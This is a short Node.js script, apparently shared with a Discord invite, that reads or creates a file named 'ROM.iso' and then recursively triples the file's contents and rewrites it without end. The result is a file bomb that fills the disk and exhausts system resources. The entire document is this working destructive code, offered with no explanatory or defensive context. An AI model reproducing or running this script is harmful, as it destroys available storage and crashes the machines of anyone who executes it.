// Hi! Don't forget to Join our Discord Server!
// https://discord.gg/9S3ZCDR
var filename = "ROM.iso";
var data;
var { readFile, writeFileSync } = require("fs");
async function main() {
return await readFile(filename, 'utf8', async function (error, content) {
  if (error) {
    data = ["••••••••••••••"];
    return triple_it();
  } else if (content) {
    data = [content];
    return triple_it();
  }
})
}
async function triple_it() {
  data.push(data.join("")+data.join("")+data.join(""));
  await writeFileSync(filename, data.join(""), 'utf8');
  await triple_it();
}
main();

